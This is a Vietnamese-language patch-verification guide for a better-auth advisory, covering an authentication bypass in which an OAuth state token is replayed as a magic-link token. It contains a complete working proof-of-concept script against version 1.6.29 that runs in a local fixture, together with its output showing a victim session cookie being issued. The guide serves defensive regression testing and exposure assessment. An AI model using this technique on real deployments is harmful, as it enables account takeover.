# Hướng Dẫn Tái Lập Regression Advisory GHSA-965c-763c-88jm (CVE-2026-114607)

Tài liệu này cung cấp hướng dẫn và mã nguồn để tái lập đối đầu (adversarial verification) lỗ hổng **GHSA-965c-763c-88jm** giữa phiên bản chưa vá (`better-auth@1.6.29`) và phiên bản đã vá (`better-auth@1.7.7`) trong môi trường fixture cô lập, tuyệt đối không làm ảnh hưởng đến mã nguồn hoặc dependencies trên nhánh PR.

---

## 1. Cơ Chế Lỗ Hổng & Bản Vá

### Lỗ hổng (Vulnerable: `better-auth < 1.7.7`)
- Khi một ứng dụng kích hoạt đồng thời cả plugin `magicLink` và các nhà cung cấp `socialProviders` (OAuth), Better Auth lưu token trong bảng/bộ sưu tập `verification` mà không phân biệt tiền tố namespace (`identifier` lưu chuỗi token trần).
- Kẻ tấn công có thể khởi tạo luồng OAuth qua `signInSocial({ provider: 'github', additionalData: { email: victimEmail } })`, nhận về tham số `state`.
- Kẻ tấn công sau đó gửi `state` đó đến endpoint `/api/auth/magic-link/verify?token=<state>`. Endpoint này tìm thấy `state` trong bảng `verification` và cấp thẳng session cookie đăng nhập dưới danh nghĩa `victimEmail` mà không cần quyền truy cập hộp thư của nạn nhân.

### Bản vá (Patched: `better-auth >= 1.7.7`)
- Better Auth bắt buộc phân tách tiền tố namespace trong bảng `verification`:
  - Luồng OAuth lưu với tiền tố: `auth-state:<state>`.
  - Luồng Magic Link lưu với tiền tố: `magic-link:<token>`.
- Khi kẻ tấn công gửi `state` sang `/api/auth/magic-link/verify`, hàm xác thực tìm kiếm khóa với tiền tố `magic-link:<token>` nên không khớp. Yêu cầu bị từ chối với lỗi `INVALID_TOKEN` (redirect `error=INVALID_TOKEN` hoặc HTTP 400), và **tuyệt đối không cấp session cookie**.

---

## 2. Các Bước Tái Lập (Reproduction Steps)

### Bước 2.1: Chạy Tái Lập Trên Bản Đã Vá (`better-auth@1.7.7` trong repo hiện tại)
Lệnh chạy trực tiếp từ thư mục gốc của repository:
```bash
npx vitest run tests/integration/better-auth-ghsa-965c-reproducer.test.ts
```
**Kết quả mong đợi:**
- **PASS**:
  - `exploitCookie === null`
  - URL chuyển hướng chứa `error=INVALID_TOKEN`
  - Bảng `verification` lưu trữ tiền tố tách biệt rõ `auth-state:` và `magic-link:`
  - Token hợp lệ của Magic Link vẫn hoạt động bình thường.

---

### Bước 2.2: Chạy Tái Lập Đối Đầu Trên Bản Cũ Chưa Vá (`better-auth@1.6.29`)
Thực hiện trong một thư mục tạm thời độc lập ngoài repo (`/tmp/better-auth-old-reproducer`):

```bash
mkdir -p /tmp/better-auth-old-reproducer
cd /tmp/better-auth-old-reproducer

# 1. Khởi tạo package độc lập và khóa phiên bản có lỗ hổng 1.6.29
cat << 'EOF' > package.json
{
  "name": "better-auth-vulnerable-reproducer",
  "version": "1.0.0",
  "type": "module",
  "dependencies": {
    "better-auth": "1.6.29"
  }
}
EOF

npm install --no-audit

# 2. Tạo script khai thác (sử dụng cùng assertion logic)
cat << 'EOF' > run-vulnerable.js
import { betterAuth } from 'better-auth';
import { magicLink } from 'better-auth/plugins';
import { memoryAdapter } from 'better-auth/adapters/memory';

async function main() {
  console.log('[Reproducer] Testing better-auth version 1.6.29...');
  const memoryDb = { user: [], session: [], account: [], verification: [] };

  const auth = betterAuth({
    database: memoryAdapter(memoryDb),
    secret: 'reproducer-vulnerable-test-secret-32-chars-min!!',
    baseURL: 'http://localhost:3000',
    basePath: '/api/auth',
    emailAndPassword: { enabled: true },
    socialProviders: {
      github: { clientId: 'mock-id', clientSecret: 'mock-secret' }
    },
    plugins: [
      magicLink({
        sendMagicLink: async () => {}
      })
    ]
  });

  const victimEmail = `victim_${Date.now()}@cashclaw.cc`;
  await auth.api.signUpEmail({
    body: { email: victimEmail, password: 'VictimPassword123!', name: 'Victim' }
  });

  const oauthInit = await auth.api.signInSocial({
    headers: new Headers(),
    body: {
      provider: 'github',
      callbackURL: 'http://localhost:3000/dashboard',
      additionalData: { email: victimEmail }
    }
  });

  const oauthState = new URL(oauthInit.url).searchParams.get('state');

  // Attempt exploit:
  const exploitReq = new Request(
    `http://localhost:3000/api/auth/magic-link/verify?token=${encodeURIComponent(oauthState)}`,
    { method: 'GET' }
  );

  const exploitRes = await auth.handler(exploitReq);
  const setCookie = exploitRes.headers.get('set-cookie');

  console.log(`[Result] HTTP Status: ${exploitRes.status}`);
  console.log(`[Result] Set-Cookie: ${setCookie}`);

  if (setCookie && setCookie.includes('better-auth.session_token')) {
    console.log('🔴 EXPLOIT SUCCESSFUL (Vulnerable): OAuth state minted victim session cookie!');
    process.exit(1); // Exit 1 demonstrates vulnerability
  } else {
    console.log('🟢 EXPLOIT BLOCKED (Patched)');
    process.exit(0);
  }
}

main().catch((err) => {
  console.error('Setup error:', err);
  process.exit(2);
});
EOF

node run-vulnerable.js
```

**Kết quả thực tế đã ghi nhận:**
```text
[Reproducer] Testing better-auth version 1.6.29...
[Result] HTTP Status: 200
[Result] Set-Cookie: better-auth.session_token=s%3A...; Path=/; HttpOnly; SameSite=Lax
🔴 EXPLOIT SUCCESSFUL (Vulnerable): OAuth state minted victim session cookie!
Exit code: 1
```

---

## 3. Ranh Giới Đánh Giá Khả Năng Khai Thác (Exploitability Boundaries)

1. **Dependency Affected:** `better-auth < 1.7.7` chứa lỗ hổng logic xác thực khi dùng chung OAuth và Magic Link.
2. **Fixture Exploitable:** Tái lập thành công trong môi trường fixture khi cấu hình cả 2 tính năng.
3. **Production Exploitability:** Mã nguồn sản xuất `src/platform/auth/auth-server.ts` **chỉ bật `emailAndPassword`**, không bật `magicLink` hay `socialProviders`. Do đó, ứng dụng sản xuất hiện tại không bị tấn công tại runtime, nhưng việc nâng cấp lên `1.7.7` là bắt buộc để triệt tiêu vĩnh viễn vector tấn công này và vượt qua rào cản CI Gate 2 (`pnpm audit --audit-level=critical`).
